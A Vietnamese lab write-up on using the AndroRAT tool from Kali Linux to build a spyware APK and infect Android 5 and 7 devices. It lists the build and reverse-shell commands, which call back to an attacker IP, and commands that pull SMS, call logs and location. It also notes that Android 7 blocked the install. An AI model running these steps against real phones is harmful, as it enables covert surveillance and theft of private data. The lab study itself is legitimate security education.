# Tấn công khai thác truy cập từ xa trên nền tảng Android bằng AndroRAT
*Google luôn phát hành các phiên bản Android mới qua từng năm, được đánh số dựa trên API level. Các thiết bị Android đang hoạt động hiện nay đều ít nhất là chạy phiên bản Android 4.0 trở lên. Mã độc được tạo ra thường nhắm vào các phiên bản Android cũ hơn (vì API level thấp, có ít rào cản bảo mật hơn) và hiện tại vẫn còn một lượng lớn người dùng đang sử dụng một phiên bản cũ, nó sẽ trở thành mục tiêu hấp dẫn cho kẻ tấn công.Mã độc được tạo ra thường nhắm vào các phiên bản Android cũ hơn (vì API level thấp, có ít rào cản bảo mật hơn) và hiện tại vẫn còn một lượng lớn người dùng đang sử dụng một phiên bản cũ, nó sẽ trở thành mục tiêu hấp dẫn cho kẻ tấn công.*
*AndroRAT (Android Remote Administration Tool) một công cụ quản trị từ xa Android. Đây là một công cụ mã nguồn mở được thiết kế để kiểm soát, giám sát và thu thập thông tin từ xa trên một thiết bị Android đã bị lây nhiễm. Bằng cơ chế tự tạo file apk chứa mã độc-đây là một phần mềm gián điệp (spyware), lừa người dùng android tải về hoặc chiếm quyền root của thiết bị và tự tải về gói mã độc rồi cài lên máy.*

## Mô hình cài đặt
<img width="852" height="646" alt="image" src="https://github.com/user-attachments/assets/69d8e18c-f2ef-450a-b56d-c8d272e28be1" />

## Yêu cầu chung
- Một máy ảo kali linux làm máy tấn công: cài đặt phần mềm AndroRAT, Ngrok, cấu hình mạng sẵn.
- Một máy android version 5
- Nếu dùng máy thật không cần cài đặt gì.
- Nếu dùng máy ảo trên môi trường máy vật lí: cài đặt phần mềm Android Studio trên máy vật lí, cấu hình sẵn mạng.
- Nếu dùng máy ảo trên môi trường ảo: cấu hình mạng sẵn như trên.

## Hướng dẫn cài đặt
- Cấu hình trên linux: `sudo apt update`, `sudo apt upgrade`
- Cài đặt AndroRAT: Mở trình duyệt, gõ tìm “androrat dowload” tìm bản github của user karma9874. Copy git và tải bằng terminal của Kali
- Cài các packge cho AndroRAT để phần mềm này có thể chạy được. Tất cả các gói package cần nằm trong thư mục requirements.txt `pip3 install -r requirments.txt`

## Triển khai tấn công
### Kịch bản 1: Tấn công vào nền tảng android version 5.0
- Tạo phần mềm apk chứa mã độc `python3 -m androRAT.py –build -i 192.168.2.132 -p 8000 -o huong.apk`
  <img width="1048" height="319" alt="image" src="https://github.com/user-attachments/assets/adbea319-f6a8-435a-b1d0-242a9f4f59a9" />
  
- Lây nhiễm file vào máy nạn nhân
<img width="1056" height="611" alt="image" src="https://github.com/user-attachments/assets/bd41916d-ec51-4eb4-a2ef-0358d3a82cb9" />

- Tạo kết nối shell ngược về máy kẻ tấn công `python3 -m androRAT.py –shell -i 192.168.2.132 -p 8000`
<img width="1047" height="669" alt="image" src="https://github.com/user-attachments/assets/bfa63406-73db-492f-92a9-dab8497f507f" />

- Một số lệnh thu thập thông tin máy nạn nhân: `deviceInfo` `camList` `getSMS inbox` `getSMS sent` 
`stopAudio` `getCallLogs` `getLocation` `vibrate 5`
### Kịch bản 2: Tấn công vào nền tảng android version 7.0
- Thực hiện tương tự như trên, ở bước cài file độc lên máy nạn nhân đã bị cản trở, một cảnh báo tiếp lại xuất hiện không cho tải file độc về máy, cảnh báo lặp đi lặp lại dù spam keep.
- Thử cách tải khác thông qua `./adb.exe shell`, sau đó đẩy thẳng file độc vào ổ nhớ máy nạn nhân
<img width="1087" height="137" alt="image" src="https://github.com/user-attachments/assets/521cfad8-c829-4ba3-9ef8-e815b22eea10" />

- Click vào file để install nhưng kết quả cài đặt thất bại, dù đã spam nút install rất nhiều lần, đều bị thiết bị từ chối.
<img width="691" height="824" alt="image" src="https://github.com/user-attachments/assets/ced82fca-721d-40a3-b4bf-3dd859204503" />

- Lý do là các phiên bản từ Android 7 trở đi đã giới thiệu các cơ chế bảo mật nghiêm ngặt hơn so với các phiên bản cũ, đặc biệt liên quan đến quyền truy cập tệp và nguồn gốc của ứng dụng. Vì file apk được biên dịch với sdk version quá thấp, khiến android 7 coi là không an toàn. Đặc biệt Từ Android 7.0, việc chia sẻ file (APK) thông qua các URL file:// giữa các ứng dụng được coi là không an toàn và bị chặn. Mặc dù tải về thành công nhưng sẽ không được phép install vào thiết bị.

## Kết quả
Chi tiết cấu hình, thực hiện triển khai và kết quả được trình bày ở video: [(youtube) Khai thác truy cập...](https://youtu.be/IZN7VGSTvVc?si=hscJuLFhCV5BEoPV)

